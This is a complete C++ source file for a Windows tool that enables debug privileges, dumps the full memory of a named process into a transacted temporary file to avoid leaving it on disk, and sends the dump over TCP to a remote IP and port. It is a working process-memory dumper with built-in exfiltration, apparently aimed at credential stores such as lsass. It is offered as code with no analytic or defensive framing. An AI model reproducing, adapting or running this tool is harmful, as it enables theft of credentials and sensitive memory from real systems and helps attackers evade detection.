#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Windows.h>
#include <Dbghelp.h>
#include <iostream>
#include <winnt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <ktmw32.h>
#include <winsock2.h>

#pragma comment (lib, "dbghelp") 
#pragma comment(lib, "KtmW32.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")




int Send_via_sokcet(char* ip4, int port, LPVOID buffer, int size)
{
	WSADATA wsaData;
	SOCKET  SendingSocket;
	// Server/receiver address
	SOCKADDR_IN ServerAddr, ThisSenderInfo;
	// Server/receiver port to connect to
	int  RetCode;
	// Be careful with the array bound, provide some checking mechanism...
	int BytesSent, nlen;
	// Initialize Winsock version 2.2
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// Create a new socket to make a client connection.
	// AF_INET = 2, The Internet Protocol version 4 (IPv4) address family, TCP protocol
	SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (SendingSocket == INVALID_SOCKET)
	{
		std::cout << "Client: socket() failed! Error code: "<< WSAGetLastError() << "\n";
		// Do the clean up
		WSACleanup();
		// Exit with error
		return -1;
	}
	else
		std::cout << "Client: socket() is OK!\n";
	// Set up a SOCKADDR_IN structure that will be used to connect
	// to a listening server on port 5150. For demonstration
	// purposes, let's assume our server's IP address is 127.0.0.1 or localhost
	// IPv4
	ServerAddr.sin_family = AF_INET;
	// Port no.
	ServerAddr.sin_port = htons(port);
	// The IP address
	ServerAddr.sin_addr.s_addr = inet_addr(ip4);
	// Make a connection to the server with socket SendingSocket.
	RetCode = connect(SendingSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr));
	if (RetCode != 0)
	{
		std::cout << "Client: connect() failed! Error code: " << WSAGetLastError() << "\n";
		// Close the socket
		closesocket(SendingSocket);
		// Do the clean up
		WSACleanup();
		// Exit with error
		return -1;
	}
	else
	{
		std::cout << "Client: connect() is OK, got connected...\n";
		std::cout <<  "Client: Ready for sending and/or receiving data...\n";
	}
	// At this point you can start sending or receiving data on
	// the socket SendingSocket.
	// Some info on the receiver side...
	BytesSent = send(SendingSocket, (char*)buffer, size, 0);
	if (BytesSent == SOCKET_ERROR)
		std::cout << "Client: send() error " << WSAGetLastError() << "\n";
	else
	{
		std::cout << "Client: send() is OK - bytes sent: " <<  BytesSent <<"\n";
		// Some info on this sender side...
		// Allocate the required resources
		memset(&ThisSenderInfo, 0, sizeof(ThisSenderInfo));
		nlen = sizeof(ThisSenderInfo);
		getsockname(SendingSocket, (SOCKADDR *)&ThisSenderInfo, &nlen);
	}
	if (shutdown(SendingSocket, SD_SEND) != 0)
		std::cout << "Client: Well, there is something wrong with the shutdown(). The error code :" << WSAGetLastError();
	else
		std::cout << "Client: shutdown() looks OK...\n";
	// When you are finished sending and receiving data on socket SendingSocket,
	// you should close the socket using the closesocket API. We will
	// describe socket closure later in the chapter.
	if (closesocket(SendingSocket) != 0)
		std::cout << "Client: Cannot close \"SendingSocket\" socket. Error code: " <<  WSAGetLastError();
	else
		std::cout << "Client: Closing \"SendingSocket\" socket...\n" ;
	// When your application is finished handling the connection, call WSACleanup.
	if (WSACleanup() != 0)
		std::cout << "Client: WSACleanup() failed!...\n";
	else
		std::cout << "Client: WSACleanup() is OK...\n";
	return 0;
}

bool enableDebugPrivileges() {

	HANDLE hcurrent = GetCurrentProcess();

	if (!hcurrent)
	{
		std::cout << "could not open current process " << GetLastError() << "\n";
		system("pause");
		exit(0);
	}

	HANDLE hToken;

	BOOL bret = OpenProcessToken(hcurrent, 40, &hToken);

	if (!bret)
	{
		std::cout << "could not open token error code " << GetLastError() << "\n";
		system("pause");
		exit(0);
	}

	LUID luid;
	bret = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);

	if (!bret)
	{
		std::cout << "LookupPrivilegeValue error: " << GetLastError() << "\n";
		system("pause");
		return FALSE;
	}

	TOKEN_PRIVILEGES NewState, PreviousState;
	DWORD ReturnLength;
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = luid;
	NewState.Privileges[0].Attributes = 2;
	if (!AdjustTokenPrivileges(hToken, FALSE, &NewState, 28, &PreviousState, &ReturnLength))
	{
		std::cout << "AdjustTokenPrivileges error: " << GetLastError() << "\n";
		return FALSE;

	}
	return TRUE;
}



void WriteFullDump(HANDLE hProc, HANDLE hFile)
{


	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithThreadInfo;

	bool Result = MiniDumpWriteDump(hProc,
		GetProcessId(hProc),
		hFile,
		(MINIDUMP_TYPE)Flags,
		NULL,
		NULL,
		NULL);


	if (!Result)
	{
		std::cout << "Looks like an error: MiniDumpWriteDump failed error code " << GetLastError();
		system("pause");
	}

}



DWORD FindProcessId(const char *processname)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD result = NULL;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32); // <----- IMPORTANT

										  // Retrieve information about the first process,
										  // and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		std::cout << "Failed to gather information on system processes! error code " << GetLastError() << "\n";
		system("pause");
		return(NULL);
	}

	do
	{
		if (0 == strcmp(processname, pe32.szExeFile))
		{
			result = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return result;
}


int save_dump_to_memory(LPVOID mem, HANDLE file, SIZE_T size)
{
	DWORD bytesRead;
	ReadFile(file, mem, size, &bytesRead, NULL);
	std::cout << "read " << bytesRead << " from the transacted file in memory \n";
	return bytesRead;
}

LPVOID AllocateMemoryToDump(HANDLE process, SIZE_T size)
{
	LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
	if (!mem)
	{

		std::cout << "could not allocate error code " << GetLastError() << "\n";
		system("pause");
	}
	memset(mem, '\xcc', size);
	return(mem);
}



int main(int argc, char **argv)
{

	// Validate the parameters
	if (argc != 4) {
		std::cout << "usage: " << argv[0] << "<server_address> <port> <process name> \n";
		return 1;
	}

	char *ip = argv[1];
	int port = atoi(argv[2]);
	char* proc_name = argv[3];

	std::cout << "connecting to " << ip << " in port "<< port <<  " locating process " << proc_name << "\n";
	enableDebugPrivileges();
	SIZE_T size = 200000000;//get_maximum_process_size(process);

	DWORD pid = FindProcessId(proc_name);

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, pid);
	if (!process)
	{
		std::cout << "could not open process handle error code " << GetLastError() << "\n";
		system("pause");
		exit(0);
	}

	HANDLE ReadPipe;
	HANDLE WritePipe;



	char file_name[150];
	
	if (!ExpandEnvironmentStrings("%temp%", file_name, 150))
	{
		std::cout << "could not expand envirmoent variable error code " << GetLastError() << "\n";
	}
	
	strcat_s(file_name, "\\trans_file");

	std::cout << "file path " << file_name << "\n";

	HANDLE trans_Handle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (trans_Handle == INVALID_HANDLE_VALUE)
	{
		std::cout << "Error CreateTransaction(): GLE= " << GetLastError() << "\n";
		exit(1);
	}

	USHORT a = 0xFFFF;
	HANDLE trans_file = CreateFileTransactedA(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, trans_Handle, &a, NULL);
	if (trans_file == INVALID_HANDLE_VALUE)
	{
		std::cout << "Error CreateFileTransactedA(): GLE= " << GetLastError() << "\n";
		exit(1);
	}

	WriteFullDump(process, trans_file);

	CloseHandle(trans_file);
	trans_file = CreateFileTransactedA(file_name, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, trans_Handle, &a, NULL);
	if (trans_file == INVALID_HANDLE_VALUE)
	{
		std::cout << "Error CreateFileTransactedA(): GLE= " << GetLastError() << "\n";
		exit(1);
	}

	LPVOID mem = AllocateMemoryToDump(process, size);

	if (!mem)
	{
		std::cout << "could not open file handle error code " << GetLastError() << "\n";
		system("pause");
		exit(0);
	}

	int dump_size = save_dump_to_memory(mem, trans_file, size);
	if (!dump_size)
	{
		std::cout << "could not save dump to memory error code " << GetLastError() << "\n";
		system("pause");
		exit(0);
	}


	Send_via_sokcet(ip, port, mem, dump_size);
	CloseHandle(trans_Handle);
	CloseHandle(trans_file);


	


}